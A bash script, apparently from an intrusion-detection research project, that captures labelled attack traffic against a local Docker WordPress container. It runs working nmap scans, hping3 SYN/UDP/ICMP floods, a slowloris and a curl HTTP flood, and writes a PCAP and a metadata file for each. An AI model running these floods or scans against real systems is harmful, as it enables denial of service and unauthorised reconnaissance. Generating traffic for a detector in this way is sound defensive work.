#!/usr/bin/env bash
# ---------------------------------------------------------------------------
# collect_attack.sh — capture labelled ATTACK traffic on a single machine.
#
# Uses the local Docker WordPress stack as a realistic victim: attacks target
# the container IP over the docker bridge (a real L2 interface, MTU 1500 — so
# the traffic looks like your normal Wi-Fi capture, NOT loopback). One clean
# PCAP + a metadata JSON per attack type, so the flow labeller can mark only the
# true attack flows and keep any background traffic benign.
#
# Run:   sudo ./collect_attack.sh                 # all attacks
#        sudo ./collect_attack.sh synflood        # one attack
#        sudo VICTIM=172.18.0.4 IFACE=br-1fbaeb82b180 ./collect_attack.sh
#
# Needs root (tcpdump + hping3 raw sockets). Requires: tcpdump, nmap, hping3,
# slowhttptest (sudo apt install nmap hping3 slowhttptest).
# ---------------------------------------------------------------------------
set -uo pipefail

HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
OUTDIR="${OUTDIR:-$HERE/../dataset/attack}"
DUR="${DUR:-20}"                       # seconds per flood/slow attack
# hping3 send interval: u200 ≈ 5000 pkt/s. A *bounded* flood — fast enough for a
# clear DoS signature, but it won't emit millions of 1-packet flows (which would
# wreck class balance vs normal) or fill the disk. Set FLOOD_RATE=--flood for a
# true max-rate flood only if you have plenty of disk + will subsample later.
FLOOD_RATE="${FLOOD_RATE:--i u200}"
WP_CONTAINER="${WP_CONTAINER:-pen_af_wp}"
MIN_FREE_MB="${MIN_FREE_MB:-2048}"     # abort if less free space than this

if [[ $EUID -ne 0 ]]; then
  echo "!! Run with sudo (tcpdump + hping3 need root):  sudo ./collect_attack.sh"
  exit 1
fi
mkdir -p "$OUTDIR"

# --- disk-space guard (captures can be large) -----------------------------
FREE_MB="$(df -Pm "$OUTDIR" | awk 'NR==2{print $4}')"
if [[ "${FREE_MB:-0}" -lt "$MIN_FREE_MB" ]]; then
  echo "!! Only ${FREE_MB}MB free in $OUTDIR (need >= ${MIN_FREE_MB}MB)."
  echo "   Free some space first (old flood PCAPs are large), or lower MIN_FREE_MB."
  exit 1
fi

# --- discover victim + bridge from Docker (unless overridden) -------------
VICTIM="${VICTIM:-$(docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' "$WP_CONTAINER" 2>/dev/null)}"
if [[ -z "${VICTIM:-}" ]]; then
  echo "!! Could not find victim IP (container '$WP_CONTAINER')."
  echo "   Set VICTIM=<ip> and IFACE=<bridge>, or start the WordPress stack."
  exit 1
fi
# bridge interface that carries the victim subnet
SUBNET_GW="$(ip route get "$VICTIM" 2>/dev/null | grep -oP 'src \K[0-9.]+' | head -1)"
IFACE="${IFACE:-$(ip route get "$VICTIM" 2>/dev/null | grep -oP 'dev \K[^ ]+' | head -1)}"
ATTACKER="${ATTACKER:-$SUBNET_GW}"

if [[ -z "${IFACE:-}" ]]; then
  echo "!! Could not determine capture interface for $VICTIM. Set IFACE=..."; exit 1
fi

echo "=============================================================="
echo "  ATTACK capture"
echo "  victim=$VICTIM  attacker=$ATTACKER  iface=$IFACE  dur=${DUR}s"
echo "  out=$OUTDIR"
echo "=============================================================="

for t in tcpdump nmap hping3 slowhttptest; do
  command -v "$t" >/dev/null 2>&1 || echo "  ! missing: $t (sudo apt install $t)"
done

# --- helpers --------------------------------------------------------------
CAP_PID=""
start_cap() {   # $1 = pcap path ; captures ONLY attacker<->victim traffic
  local pcap="$1"
  tcpdump -i "$IFACE" -nn -s 0 "host $VICTIM" -w "$pcap" >/dev/null 2>&1 &
  CAP_PID=$!
  sleep 1.5
  kill -0 "$CAP_PID" 2>/dev/null || { echo "  !! tcpdump failed"; return 1; }
}
stop_cap() {
  [[ -n "$CAP_PID" ]] || return 0
  kill -INT "$CAP_PID" 2>/dev/null || true
  wait "$CAP_PID" 2>/dev/null || true
  CAP_PID=""
}
now() { date +%s.%N; }

# write the metadata sidecar the labeller reads (--meta)
write_meta() {   # $1 name  $2 pcap  $3 ports(csv)  $4 start  $5 end
  local name="$1" pcap="$2" ports="$3" start="$4" end="$5"
  local json="${pcap%.pcap}.meta.json"
  local ports_arr
  ports_arr="$(echo "$ports" | sed 's/,/, /g')"
  cat > "$json" <<EOF
{
  "attack_type": "$name",
  "victim_ip": "$VICTIM",
  "attacker_ip": "$ATTACKER",
  "victim_ports": [${ports_arr}],
  "start_ts": $start,
  "end_ts": $end
}
EOF
  echo "  meta -> $(basename "$json")"
}

run_attack() {   # $1 name  $2 ports  <function body via $3.. command>
  local name="$1" ports="$2"; shift 2
  local pcap="$OUTDIR/attack_${name}.pcap"
  echo; echo "--- $name -> $(basename "$pcap") ---"
  start_cap "$pcap" || return
  local start; start="$(now)"
  "$@"                                  # run the attack command(s)
  local end; end="$(now)"
  stop_cap
  write_meta "$name" "$pcap" "$ports" "$start" "$end"
  if [[ -f "$pcap" ]]; then echo "  saved $(du -h "$pcap" | cut -f1)"; fi
}

# --- attack definitions ---------------------------------------------------
a_portscan() {
  # bounded SYN sweep + service/UDP scans. Every nmap call is timeout-wrapped and
  # port-bounded so a firewalled/dropping host can't stall it (the old full
  # 1-65535 scan could hang for an hour). Still a clear recon signature.
  timeout 120 nmap -T4 -sS -p 1-10000 --max-retries 1 --host-timeout 110s "$VICTIM" >/dev/null 2>&1 || true
  timeout 60  nmap -T4 -sV --top-ports 100 --max-retries 1 --host-timeout 55s "$VICTIM" >/dev/null 2>&1 || true
  timeout 45  nmap -T4 -sU --top-ports 30  --max-retries 1 --host-timeout 40s "$VICTIM" >/dev/null 2>&1 || true
}
a_synflood() { timeout "$DUR" hping3 -S $FLOOD_RATE -p 80 "$VICTIM" >/dev/null 2>&1 || true; }
a_udpflood() { timeout "$DUR" hping3 --udp $FLOOD_RATE -p 80 "$VICTIM" >/dev/null 2>&1 || true; }
a_icmpflood(){ timeout "$DUR" hping3 -1 $FLOOD_RATE "$VICTIM"        >/dev/null 2>&1 || true; }
a_slowloris(){
  timeout "$((DUR+10))" slowhttptest -c 800 -H -i 10 -r 200 -t GET \
    -u "http://$VICTIM/" -x 24 -p 3 >/dev/null 2>&1 || true
}
a_httpflood(){
  # burst of HTTP GETs (application-layer flood) for DUR seconds.
  # NOTE: wait ONLY on the curl PIDs we launch — a bare `wait` would also block
  # on the capture tcpdump (which never exits) and hang the whole step.
  local end=$((SECONDS + DUR)) pids
  while [ $SECONDS -lt $end ]; do
    pids=()
    for _ in $(seq 1 40); do
      curl -s -m 5 -o /dev/null "http://$VICTIM/?_=$RANDOM" & pids+=($!)
    done
    wait "${pids[@]}" 2>/dev/null || true
  done
}

declare -A ATTACKS=(
  [portscan]="1-65535"
  [synflood]="80"
  [udpflood]="80"
  [icmpflood]="0"
  [slowloris]="80"
  [httpflood]="80"
)

cleanup() {
  stop_cap
  # kill any attack tools we spawned so nothing is orphaned on Ctrl+C
  pkill -P $$ 2>/dev/null || true
  pkill -9 -f "hping3 .*$VICTIM"       2>/dev/null || true
  pkill -9 -f "nmap .*$VICTIM"         2>/dev/null || true
  pkill -9 -f "slowhttptest .*$VICTIM" 2>/dev/null || true
}
trap 'echo; echo "interrupted"; cleanup; exit 130' INT TERM
trap cleanup EXIT

# --- run selection --------------------------------------------------------
SEL=("$@")
[[ ${#SEL[@]} -eq 0 ]] && SEL=(portscan synflood udpflood icmpflood slowloris httpflood)

for name in "${SEL[@]}"; do
  case "$name" in
    portscan)  run_attack portscan  "" a_portscan ;;   # empty ports = whole scan is attack (any port to victim)
    synflood)  run_attack synflood  "80"    a_synflood ;;
    udpflood)  run_attack udpflood  "80"    a_udpflood ;;
    icmpflood) run_attack icmpflood "0"     a_icmpflood ;;
    slowloris) run_attack slowloris "80"    a_slowloris ;;
    httpflood) run_attack httpflood "80"    a_httpflood ;;
    *) echo "  ?? unknown attack '$name' (portscan synflood udpflood icmpflood slowloris httpflood)";;
  esac
done

echo
echo "=============================================================="
echo "  Done. PCAPs + .meta.json in $OUTDIR"
echo "  Convert with windowed labelling, e.g.:"
echo "    for p in $OUTDIR/attack_*.pcap; do"
echo "      python3 src/preprocessing/pcap_to_flows.py --pcap \"\$p\" --label 1 \\"
echo "        --meta \"\${p%.pcap}.meta.json\" --out \"data/flows/\$(basename \${p%.pcap}).csv\""
echo "    done"
echo "=============================================================="
